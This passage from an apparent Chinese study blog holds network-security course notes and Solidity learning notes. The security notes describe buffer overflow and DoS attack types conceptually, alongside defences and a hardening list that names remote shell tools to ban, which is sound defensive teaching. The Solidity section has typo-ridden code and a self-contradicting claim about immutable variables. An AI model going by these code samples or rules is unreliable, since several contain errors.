0，则密码从不过期。</li><li>密码最短使用期限。确定用户可以更改新密码之前这些新密码必须保留的天数。此设置被设计为与“强制密码历史”设置一起使用，这样用户就不能很快地重置有次数要求的密码并更改回旧密码。</li><li>密码长度最小值。确定密码最少可以有多少个字符。</li></ul><ol start="4"><li><strong>采用加密的通信协议</strong>。</li></ol><p> 比如在使用web邮箱时，可以采用更加安全的https。</p><ol start="5"><li><strong>使用U盾输入口令，降低键盘记录攻击的威胁。</strong></li></ol><p>  另外，访问网站时，注意区分是否是虚假站点。</p><h3 id="6-5-缓冲区溢出攻击"><a href="#6-5-缓冲区溢出攻击" class="headerlink" title="6.5 缓冲区溢出攻击"></a>6.5 缓冲区溢出攻击</h3><h4 id="6-5-1-缓冲区溢出的概念"><a href="#6-5-1-缓冲区溢出的概念" class="headerlink" title="6.5.1 缓冲区溢出的概念"></a>6.5.1 缓冲区溢出的概念</h4><p><strong>缓冲区</strong>：</p><p> 从程序的角度，缓冲区就是应用程序用来保存用户输入数据和代码的临时数据的内存空间。</p><p><strong>缓冲区溢出</strong>：</p><p> 如果用户输入的数据长度超出了程序为其分配的内存空间，这些数据就会覆盖程序为其它数据分配的内存空间，形成所谓的缓冲区溢出。</p><p><strong>缓冲区溢出的危害</strong>：</p><p> 缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统和应用软件中广泛存在。利用缓冲区溢出攻击，可以导致程序运行失败、系统当机和重新启动等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。</p><h4 id="6-5-2-缓冲区溢出的基本原理"><a href="#6-5-2-缓冲区溢出的基本原理" class="headerlink" title="6.5.2 缓冲区溢出的基本原理"></a>6.5.2 缓冲区溢出的基本原理</h4><p>缓冲溢出通常在程序缓冲区编写超出其长度的代码——造成溢出，从而破坏其堆栈，使程序执行攻击者在程序地址空间中早已安排好的代码以达到其目的。</p><p>由于name只有8字节大小，在进行strcpy前，并没有检测argv[1]的长度，如果argv[1]的长度大于8，则复制时就会覆盖name数组后面的ebp的内容及main函数的返回地址。等函数返回时，程序就会跳转到修改后的地址去执行。</p><p><strong>几种实现缓冲区攻击的方法</strong></p><p> 在程序的地址空间里安排适当的代码</p><ul><li>•植入法。</li><li>•利用已经存在的代码。</li></ul><p> 通过适当的初始化寄存器和内存，让程序跳转到攻击者安排的地址空间执行</p><ul><li>•通过Activation Records（活动记录）改变地址</li><li>•通过Function Pointers（函数指针）改变地址</li><li>•通过Longjmpbuffers（长跳转缓冲区）改变地址</li></ul><h4 id="6-5-3-缓冲区溢出的类型"><a href="#6-5-3-缓冲区溢出的类型" class="headerlink" title="6.5.3 缓冲区溢出的类型"></a>6.5.3 缓冲区溢出的类型</h4><p><strong>按照溢出缓冲区所在的区域类型来划分，可分为栈溢出和堆溢出</strong></p><p>•栈溢出特点：缓冲区在栈中分配；拷贝的数据过长；覆盖了函数的返回地址、其它一些重要数据结构或函数指针</p><p>•堆溢出特点：缓冲区在堆中分配；拷贝的数据过长；覆盖了堆管理结构</p><p>•其他溢出类型中，最典型的就是整型溢出</p><p>•整型数溢出从造成溢出原因的角度来说可以分为三大类：存储溢出、计算溢出和符号问题</p><h4 id="6-5-4-缓冲区溢出的防范"><a href="#6-5-4-缓冲区溢出的防范" class="headerlink" title="6.5.4 缓冲区溢出的防范"></a>6.5.4 缓冲区溢出的防范</h4><p><strong>对缓冲区溢出的防范方法主要有以下几种方式</strong>：</p><p> 编写严格的代码</p><p> 不可执行堆栈数据段</p><p> 利用程序编译器的边界检查</p><p> 指针完整性检查</p><h3 id="6-6-拒绝服务攻击"><a href="#6-6-拒绝服务攻击" class="headerlink" title="6.6 拒绝服务攻击"></a>6.6 拒绝服务攻击</h3><h4 id="6-6-1-拒绝服务攻击的概念"><a href="#6-6-1-拒绝服务攻击的概念" class="headerlink" title="6.6.1 拒绝服务攻击的概念"></a>6.6.1 拒绝服务攻击的概念</h4><p><strong>服务：</strong></p><p> 是指系统提供的，用户需求的一些功能。</p><p><strong>拒绝服务</strong>（DoS）：</p><p> DoS是Denial of Service的简称，即拒绝服务，任何对服务的干涉，使得其可用性降低或者失去可用性均称为拒绝服务。例如一个计算机系统崩溃或其带宽耗尽或其硬盘被填满，导致其不能提供正常的服务，就构成拒绝服务。</p><p><strong>拒绝服务攻击</strong>：</p><p> 造成DoS的攻击行为被称为DoS攻击，其目的是使计算机或网络无法提供正常的服务。</p><p><strong>分布式拒绝服务（DDoS）攻击：</strong></p><p> 如果处于不同位置的多个攻击者同时向一个或数个目标发起攻击，或者一个或多个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击</p><h4 id="6-6-2-利用系统漏洞进行拒绝服务攻击"><a href="#6-6-2-利用系统漏洞进行拒绝服务攻击" class="headerlink" title="6.6.2 利用系统漏洞进行拒绝服务攻击"></a>6.6.2 利用系统漏洞进行拒绝服务攻击</h4><p>•系统漏洞是包含在操作系统或应用程序中与安全相关的系统缺陷。这些缺陷大多是由于错误的编程、粗心的源代码审核或一些不当的绑定所造成的，常被攻击者利用</p><p> 例如微软的Windows 操作系统中的安全漏洞允许rootkits在使用操作系统的计算机上隐藏起来或者实施拒绝服务器攻击</p><p> Windows GDI Plus library存在处理畸形图象漏洞，可能引起远程拒绝服务</p><p>•解决这类攻击方法只能是不停的修复漏洞，同时加强管理人员对这类问题的重视程度</p><h4 id="6-6-3-利用协议漏洞进行拒绝服务攻击"><a href="#6-6-3-利用协议漏洞进行拒绝服务攻击" class="headerlink" title="6.6.3 利用协议漏洞进行拒绝服务攻击"></a>6.6.3 利用协议漏洞进行拒绝服务攻击</h4><p>•几个典型的利用协议漏洞进行的拒绝服务攻击：</p><p> <strong>SYN Flood</strong></p><p> UDP flood拒绝服务攻击</p><p> <strong>Land攻击</strong></p><p>   这是利用漏洞，进行发送大量的源地址与目的地址相同的包，从而造成服务器解析Land包时占用大量的处理资源，当收到的包达到一定程度时，就会形成拒绝服务攻击。</p><p> <strong>死Ping</strong></p><p>   Ping是通过发送ICMP报文来判断主机是否存活。利用这个命令就能发动一次攻击，当发送超大型这种包时，也就是发送的包超过65535字节会造成服务器重组包时发生缓冲区溢出，从而让服务器崩溃发生拒绝服务。</p><h4 id="6-6-4-对拒绝服务攻击的防范"><a href="#6-6-4-对拒绝服务攻击的防范" class="headerlink" title="6.6.4 对拒绝服务攻击的防范"></a>6.6.4 对拒绝服务攻击的防范</h4><ul><li>•确保所有服务器采用最新系统，并打上安全补丁</li><li>•删除多余的网络服务</li><li>•自己定制防火墙规则</li><li>•确保从服务器相应的目录或文件数据库中删除未使用的服务</li><li>•禁止内部网通过Modem连接至PSTN系统</li><li>•禁止使用网络访问程序如Telnet、Ftp、Rsh、Rlogin和Rcp，以基于PKI的访问程序如SSH取代</li></ul><p>​（ps: rsh是”remote shell”(远程 shell)的缩写，该命令在指定的远程主机上启动一个shell并执行用户在rsh命令行中指定的命令;如果用户没有给出要执行的命令，rsh就用rlogin命令使用户登录到远程机上。</p><p>​remote file copy，即远程文件拷贝)</p><ul><li>•限制在防火墙外与网络文件共享</li><li>•在防火墙上运行端口映射程序或端口扫描程序</li><li>•检查所有网络设备和主机&#x2F;服务器系统的日志</li><li>•确保管理员对所有主机进行检查，而不仅针对关键主机</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础001</title>
      <link href="/2024/11/07/solidity%E5%9F%BA%E7%A1%80%EF%BC%881%EF%BC%89/"/>
      <url>/2024/11/07/solidity%E5%9F%BA%E7%A1%80%EF%BC%881%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>关键词：变量 数值类型 函数 数组 印射<br>仅个人学习使用（WTF学习笔记）</p><h3 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h3><h4 id="初始值"><a href="#初始值" class="headerlink" title="初始值"></a>初始值</h4><p><strong>bytes1</strong> <strong>是固定大小的字节类型，表示一个 1 字节的值（8 位）。它的初始值（默认值）是 0x00，即所有位都为 0。</strong></p><p><strong>具体解释：</strong></p><ul><li><strong>在 Solidity 中，任何未赋值的变量都会有一个默认值。对于 bytes1 类型，它的默认值是一个长度为 1 字节的值，所有的位都被初始化为 0，用十六进制表示为 0x00。</strong></li><li><strong>如果用二进制表示，它是 00000000。</strong></li></ul><p><strong>值类型初始值</strong></p><ul><li><p><strong>boolean: false</strong></p></li><li><p><strong>string: “”</strong></p></li><li><p><strong>int: 0</strong></p></li><li><p><strong>uint: 0</strong></p></li><li><p><strong>enum:</strong> <strong>枚举中的第一个元素</strong></p></li><li><p><strong>address</strong>: 0x0000000000000000000000000000000000000000 (或 address(0))</p></li><li><p><strong>function</strong></p></li><li><ul><li><strong>internal:</strong> <strong>空白函数</strong></li><li><strong>external:</strong> <strong>空白函数</strong></li></ul></li></ul><p><strong>引用类型初始值</strong></p><ul><li><p><strong>映射mapping: 所有元素都为其默认值的mapping</strong></p></li><li><p><strong>结构体struct: 所有成员设为其默认值的结构体</strong></p></li><li><p><strong>数组array</strong></p></li><li><ul><li><strong>动态数组: []</strong></li><li><strong>静态数组（定长）: 所有成员设为其默认值的静态数组</strong></li></ul></li></ul><p>Bytes4 类型表示的是一个固定长度的字节数组，长度为 4 个字节。每个字节由 2 个十六进制字符表示，因此：<br>• 1 字节 &#x3D; 2 个十六进制字符<br>• 4 字节 &#x3D; 4 × 2 &#x3D; 8 个十六进制字符<br>因此，<strong>bytes4类型具有 8 个十六进制位。</strong><br>示例：<br>例如，一个 bytes4 类型的值可能是 0x12345678，这里的 12345678 就是 8 个十六进制字符。</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h4><h4 id="可见性说明符"><a href="#可见性说明符" class="headerlink" title="可见性说明符"></a>可见性说明符</h4><h4 id="pure-view-payable"><a href="#pure-view-payable" class="headerlink" title="pure|view|payable"></a>pure|view|payable</h4><h4 id="函数输出"><a href="#函数输出" class="headerlink" title="函数输出"></a>函数输出</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function returnMultiple() public pure returns(uint256, bool, uint256[3] memory) &#123;</span><br><span class="line">   return (1, true, [uint256(1), 2, 5]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><span style = "color: blue;">此处memory是什么？</span><br>  是用于指定数据存储位置的关键字。<strong>它标识的是数据在内存中存储，而不是在区块链上永久存储，通常用于临时存储复杂数据类型（如数组或结构体）并在函数执行期间操作它们，执行完毕后释放资源</strong>。具体来说，memory 指定了在函数执行期间，数据只临时存储在内存中，一旦函数执行完毕，内存中的数据就会被释放。<br>  例如此处：uint256[3] memory 中的 memory 指定了数组 [uint256(1), 2, 5] 将在内存中临时存储，而不是在区块链的持久存储（即 storage）中存储。</p><p>  此处代码解析：</p><ul><li>uint256[3] memory: 定义了一个长度为 3 的 uint256 类型数组，并将其存储在内存中。</li><li>[unit256(1),2,5]:<br>• uint256(1)：这个表示法将 1 明确地转换为 uint256 类型。在某些情况下Solidity 可能会自动推断出整数类型为 uint256，但是为了确保类型一致性，可以使用这种显式类型转换。<br>• 2 和 5：这两个值直接写为整数，Solidity会自动将它们识别为 uint256 类型，因它们是未指定类型的字面常量，且默认情况下 Solidity 会将整数推断为 uint256。</li></ul><h2 id="变量数据存储和作用域："><a href="#变量数据存储和作用域：" class="headerlink" title="变量数据存储和作用域："></a>变量数据存储和作用域：</h2><h3 id="1-声明类型"><a href="#1-声明类型" class="headerlink" title="1. 声明类型"></a>1. 声明类型</h3><h4 id="1-1-Solidity数据存储位置"><a href="#1-1-Solidity数据存储位置" class="headerlink" title="1.1 Solidity数据存储位置"></a>1.1 Solidity数据存储位置</h4><pre><code>有三类：storage，memory和calldata。</code></pre><h4 id="1-2-赋值和引用"><a href="#1-2-赋值和引用" class="headerlink" title="1.2 赋值和引用"></a>1.2 赋值和引用</h4><h4 id="1-3常数-constant和immutable"><a href="#1-3常数-constant和immutable" class="headerlink" title="1.3常数 constant和immutable"></a><strong>1.3常数 constant和immutable</strong></h4><p><span style="color: red;"><strong>只有数值变量可以声明constant和immutable；string和bytes可以声明为constant，但不能为immutable</strong></span></p><ul><li><strong>constant变量必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过</strong></li><li><strong>immutable变量可以在声明时或构造函数中初始化</strong></li><li><strong>immutable变量既在声明时初始化，又在constructor中初始化，会使用constructor初始化的值。</strong></li></ul><h3 id="2-作用域"><a href="#2-作用域" class="headerlink" title="2. 作用域"></a>2. 作用域</h3><h4 id="2-1"><a href="#2-1" class="headerlink" title="2.1"></a>2.1</h4><h4 id="2-2"><a href="#2-2" class="headerlink" title="2.2"></a>2.2</h4><h3 id="2-3全局变量"><a href="#2-3全局变量" class="headerlink" title="2.3全局变量"></a>2.3全局变量</h3><h4 id="2-3-1以太单位-时间单位"><a href="#2-3-1以太单位-时间单位" class="headerlink" title="2.3.1以太单位&amp;时间单位"></a>2.3.1以太单位&amp;时间单位</h4><h3 id="2-4引用类型"><a href="#2-4引用类型" class="headerlink" title="2.4引用类型"></a>2.4引用类型</h3><h4 id="2-4-1数组"><a href="#2-4-1数组" class="headerlink" title="2.4.1数组"></a>2.4.1数组</h4><p>分为：<br>固定数组；<br>可变数组；<br>（bytes比较特殊，是数组，但是不用加[]另外，不能用byte[]声明单字节数组，可以使用bytes或bytes1[]。bytes比bytes1[]省gas。</p><p><strong>创建数组的规则</strong><br>对于memory修饰的动态数组，可以用new操作符号来创建，但是必须声明长度，并且声明后长度不能改变。</p><p>eg：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// memory动态数组</span><br><span class="line">uint[] memory array8 = new uint[](5);</span><br><span class="line">bytes memory array9 = new bytes(9);</span><br></pre></td></tr></table></figure><p>如果创建的是动态数组，需要一个一个元素的赋值。</p><p><strong>数组成员</strong></p><ul><li><strong>length</strong>: 数组有一个包含元素数量的<strong>length</strong>成员，<strong>memory</strong>数组的长度在创建后是固定的。</li><li><strong>push()</strong>: <strong>动态数组</strong>拥有<strong>push()<strong>成员，可以在数组最后添加一个</strong>0</strong>元素，并返回该元素的引用。</li><li><strong>push(x)</strong>: <strong>动态数组</strong>拥有<strong>push(x)<strong>成员，可以在数组最后添加一个</strong>x</strong>元素。</li><li><strong>pop()</strong>: <strong>动态数组</strong>拥有**pop()**成员，可以移除数组最后一个元素（与数据结构的栈相同）</li></ul><h4 id="2-4-2结构体"><a href="#2-4-2结构体" class="headerlink" title="2.4.2结构体"></a>2.4.2结构体</h4><p><strong>创建结构体</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//结构体</span><br><span class="line">struct Student&#123;</span><br><span class="line">uint256 id;</span><br><span class="line">uint256 score;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student student;//初始化一个student结构体</span><br></pre></td></tr></table></figure><p><strong>结构体赋值方法</strong></p><p><em>方法1:在函数中创建一个storage的struct引用</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function initStudent1() external&#123;</span><br><span class="line">Student storage _student = student;</span><br><span class="line">_stdent.id = 11;</span><br><span class="line">_student.score = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>storage</strong></p><p><em>方法2:直接引用状态变量的struct</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function initStudent2() external&#123;</span><br><span class="line">student.id = 11;</span><br><span class="line">stundet.score = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>方法3:构造函数式</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function initStudent3() external&#123;</span><br><span class="line">student = Student(11,100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>方法4:key value</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function initStudent4() external&#123;</span><br><span class="line">student = Student(&#123;id: 11,score: 100&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-3印射-（mapping"><a href="#2-4-3印射-（mapping" class="headerlink" title="2.4.3印射 （mapping)"></a>2.4.3印射 （mapping)</h4><p><strong>定义： Solidity中存储键值对的数据结构，可以理解为哈希表</strong></p><p><strong>mapping变量不存长度信息</strong></p><p>在映射中，人们可以<strong>通过键（Key）来查询对应的值（Value）</strong></p><p>比如：通过一个人的id来查询他的钱包地址。</p><p>格式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapping(_KeyType =&gt; _ValueType)</span><br></pre></td></tr></table></figure><p>其中_KeyType和_ValueType分别是Key和Value的变量类型</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mapping(uint =&gt; address) public idToAddress; // id映射到地址</span><br><span class="line">mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址</span><br></pre></td></tr></table></figure><h6 id="映射的规则"><a href="#映射的规则" class="headerlink" title="映射的规则"></a>映射的规则</h6><p><strong>规则1</strong></p><p>映射的_keytype只能选择solidity内置的值类型，比如uint,address等，不能用自定义的结构体，而_Valuetype可以使用自定义的类型（例如：结构体）。</p><p><strong>规则2</strong></p><p>映射的存储位置必须是storage，因此可以用于合约的状态变量，函数中的storage变量和library函数的参数（<a href="https://github.com/ethereum/solidity/issues/4635">例子</a>）。不能用于public函数的参数或返回结果中，因为mapping记录的是一种关系（key-value pair)。</p><p><strong>规则3</strong></p><p>如果映射声明为 public，那么Solidity会自动给你创建一个 getter 函数，可以通过 key 来查询对应的 value 。<br><strong>规则4</strong></p><p>给映射新增的键值对的语法为_var[_Key]&#x3D; _value，其中 _var 是映射变量名，_Key 和_value 对应新增的键值对。</p><p>eg: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function writeMap(uint key,address Value)public&#123;</span><br><span class="line">idToAddress[ Key]= Value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>请解释下面这段代码的意思：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">address payable addr;</span><br><span class="line">addr.transfer(1);</span><br></pre></td></tr></table></figure><p>选择一个答案<br>A. 调用者向合约转账1wei<br>B. 调用者向addr转账1wei<br>C. 合约向addr转账1wei<br>D. 合约向addr转账1ether</p><p><strong>解析：</strong></p><ul><li>address payable: 这是一个 payable 地址类型，表示这个地址能够接收以太币（ether）转账。只有 payable 地址才允许进行 transfer() 或 send() 操作。</li><li>addr.transfer(1): 这是一个转账操作，向地址 addr 转账 1 单位的以太币，单位是 wei。在以太坊中，最小的货币单位是 wei，而 1 ether &#x3D; 10^18 wei。因此，这里转账的数额是 1 wei，而不是 1 ether。</li><li>transfer操作是合约向addr转账。<br>正确答案选c</li></ul><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>以下关于数组的说法中，正确的是(选择一个答案)</p><p> A. 固定长度数组和bytes拥有push()成员，可以在数组最后添加一个0元素。</p><p> B. 数组字面常数，例如[uint(1),2,3]，需要声明第一个元素的类型，不然默认用存储空间最大的类型</p><p> C. 内存数组的长度在创建后是固定的。 </p><p> D. 对于memory可变长度数组，可以用new操作符来创建，并且不用声明长度，例如uint[] </p><p><strong>解析</strong>：</p><ul><li><p><strong>A. 固定长度数组和 bytes 拥有 push() 成员，可以在数组最后添加一个0元素。</strong><br> 这句话是错误的。<strong>固定长度数组</strong>没有 push() 成员，只有 <strong>可变长度数组</strong>     才有 push() 成员，而 bytes 是可变长度数组，因此 bytes 可以使用 push()，但固定长度数组不能。</p></li><li><p>选项 B 的说法 不正确。原因：<strong>在 Solidity 中，数组字面常量的类型推断并不会自动默认为存储空间最大的类型。</strong>类型推断基于数组字面量中的元素值：对于一个字面量数组，如 [1, 2, 3]，Solidity 会推断这些数字为最小的适当类型。例如，在这种情况下，uint8 就足够了，因为所有数字都能用 8 位来表示，而不会默认推断为 uint256。<strong>只有在数组的元素中存在更大范围的数值时，编译器才会选择相应的更大类型。如果你希望指定一个更大的类型（比如 uint256），需要显式地声明。</strong>因此，数组字面常量中的类型并不会默认使用存储空间最大的类型，而是基于实际的数值大小来推断最适合的类型。</p><p><strong>示例：</strong></p><p>[1, 2, 3] 会推断为 uint8。</p><p>[uint256(1), 2, 3] 才会显式地使用 uint256 进行类型推断。</p></li></ul><p>所以，B 选项的说法是 不正确的。</p><ul><li><p><strong>C. 内存数组的长度在创建后是固定的。</strong></p></li><li><p>D. 这句话是错误的。使用 new 操作符创建内存数组时，必须指定数组的长度，不能省略长度声明。正确的用法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint[] memory array = new uint[](length);</span><br></pre></td></tr></table></figure></li></ul><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>以下关于结构体的说法中，错误的是</p><p>选择一个答案</p><p>A. 通过结构体的形式可以定义新的类型。</p><p>B. 结构体内可以包含字符串，整型等基本数据类型，也可以包含数组，映射，结构体等复杂类型。</p><p>C. 结构体内可以包含其本身。</p><p><strong>解析</strong>：</p><ul><li>A. 这是正确的。结构体在 Solidity 中用于定义新的自定义类型，允许开发者创建更复杂的数据结构。</li><li>B. 这是正确的。结构体可以包含基本数据类型（如 uint、string），也可以包含复杂类型（如数组、映射、其他结构体）。</li><li>C.  这是错误的。在 Solidity 中，结构体不能直接包含其本身，因为这会导致无限嵌套，无法确定内存的大小。不过，结构体可以包含指向其他结构体的     引用，例如使用指针或映射的方式来实现递归关系。</li></ul><p>因此，选项 C 是错误的。</p><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p> 在如下的合约中，我们定义了四个 immutable 的变量 y1, y2, y3, y4。</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> uint256 immutable y1; </span><br><span class="line"></span><br><span class="line">address immutable y2; </span><br><span class="line"></span><br><span class="line">address immutable y3; </span><br><span class="line"></span><br><span class="line">uint256 immutable y4;</span><br><span class="line"></span><br><span class="line"> constructor (uint256 _y4)&#123; </span><br><span class="line"></span><br><span class="line">y1 = block.number; </span><br><span class="line"></span><br><span class="line">y2 = address(this);</span><br><span class="line"></span><br><span class="line">y3 = msg.sender;</span><br><span class="line"></span><br><span class="line">y4 = _y4; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>其中，确实有必要在构造函数 constructor 中才赋值的一项是： </p><p>A. y1 B. y2 C. y3 D. y4</p><p><strong>解析：</strong></p><ul><li><strong>y4 是通过构造函数参数 _y4 传入的值，因此只有在部署合约时才能确定它的值，这使得它必须在构造函数中赋值。</strong></li></ul><p><strong>其他变量在构造函数外也可以直接赋值，或者它们的值是在合约部署时自动确定的：</strong></p><ul><li><strong>y1：可以在合约外直接赋值为 block.number，表示合约部署时的区块号。</strong></li><li><strong>y2：可以直接设置为 address(this)，即合约自身的地址，在合约部署时自动确定。</strong></li><li><strong>y3：可以直接设置为 msg.sender，即部署合约的地址，也是在合约部署时自动确定的。</strong></li></ul><p><strong>因此，只有 y4 是依赖于构造函数参数，必须在构造函数中进行赋值。选D。</strong></p><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><p><strong>下面定义变量的语句中，会报错的一项是：</strong> </p><p><strong>A. string constant x5 &#x3D; “hello world”;</strong> </p><p><strong>B. address constant x6 &#x3D; address(0);</strong> </p><p><strong>C. string immutable x7 &#x3D; “hello world”;</strong> </p><p><strong>D. address immutable x8 &#x3D; address(0);</strong></p><p><strong>解析：</strong></p><ul><li><strong>在 Solidity 中，immutable 变量必须在 构造函数中 赋值，而不能在声明时直接赋值。</strong></li></ul><p><strong>具体说明：</strong></p><ul><li>**A. string constant x5 &#x3D; “hello world”;**<strong>：constant 变量必须在声明时赋值，因此这是正确的。</strong></li><li>**B. address constant x6 &#x3D; address(0);**<strong>：constant 变量在声明时赋值是正确的。</strong></li><li>**C. string immutable x7 &#x3D; “hello     world”;**<strong>：这是错误的，因为 immutable 变量不能在声明时赋值，必须在构造函数中进行赋值。</strong></li><li>**D. address immutable x8 &#x3D; address(0);**<strong>：虽然是 immutable 变量，但它的赋值可以在构造函数中完成，定义时不能直接赋值。此处代码如果在构造函数中赋值是正确的。</strong></li></ul><p><strong>因此，选项 C 会报错。</strong></p><p> <strong>ps</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//命名式返回</span><br><span class="line">function returnNamed() public pure returns(uint256_number, bool _bool, uint256[3] memory _array)(</span><br><span class="line">_number = 2;</span><br><span class="line">_bool = false;</span><br><span class="line">_array = [uint256(3),2,1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>命名式返回，依然支持return</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function returnNamed2() public pure returns(uint256 _number,bool _bool,unit256[3] memory _arrray)</span><br><span class="line">&#123;</span><br><span class="line"> return(1,true,[unit256(1),2,5]);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ul><li><p>_array 被赋值为 [uint256(3), 2, 1]。这表示它是一个包含三个元素的数组，其中：<br>• 第一个元素是 3（明确类型转换为 uint256）。<br>• 第二个元素是 2（自动推断为 uint256）。<br>• 第三个元素是 1（自动推断为 uint256）。</p></li><li><p>Solidity中不存在小数点，以0代替为小数点，举例<br>在Solidity 中，确实没有内置的浮点数（即小数点），因此所有数字必须使用整数类型来表示。这就需要通过一些技巧来模拟小数点，通常是通过将小数值放大为整数来进行计算。例如，如果要表示金额，可以假设整数中的最低位是 “小数点后的一位” 或更多位，这样就能间接表示小数。<br>例子：<br>假设我们想在 Solidity 中表示货币金额，而没有浮点数。我们可以使用整数表示金额，并通过约定整数的最后几位代表小数部分。常见的方法是<strong>将金额放大 10^18（即使用以太坊中的 wei 单位），将以太作为以太坊中的基本单位</strong>。<br>举例 1: 表示金额<br>假设要表示 1.5 个以太币。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint256 public amount = 1.5 * 10**18; // 1.5 Ether 等于 1.5 * 10^18 wei</span><br></pre></td></tr></table></figure><p>• 在这里，我们使用 10^18 来表示一个以太币，因为<strong>1 ether &#x3D; 10^18 wei</strong>。为了表示 1.5 个以太币，我们将 1.5 乘以 10^18，最终得到 1500000000000000000 wei。<br>• 尽管 Solidity 不支持浮点数，但我们通过使用整数和固定的精度来实现。<br>举例 2: 模拟小数点计算<br>假设我们有一个代币，代币的精度是小数点后 2 位。我们可以通过放大 100 倍来处理小数点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint256 public pricePerToken = 150; // 实际上表示 1.50 单位（放大了100倍）</span><br></pre></td></tr></table></figure><p><strong>我们可以通过数学计算来恢复小数点后的值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint256 price = pricePerToken / 100;      // 还原整数部分</span><br><span class="line">uint256 decimals = pricePerToken % 100;   // 取出小数部分</span><br></pre></td></tr></table></figure><p>这样 150 就表示 1.50，即使用整数的 150 来代表 1.50。<br>举例 3: 更高精度<br>如果需要<strong>更多的精度，比如小数点后 6 位，可以通过乘以 10^6 来处理</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint256 public value = 1234567; // 实际表示 1.234567</span><br><span class="line">总结</span><br></pre></td></tr></table></figure><p>在 Solidity 中，通过使用整数来表示带有小数点的值，可以避免精度问题。具体方法是根据需要的精度将小数部分转化为整数进行计算，并在使用时再将其缩放回实际数值。例如，通过乘以 10^18 或 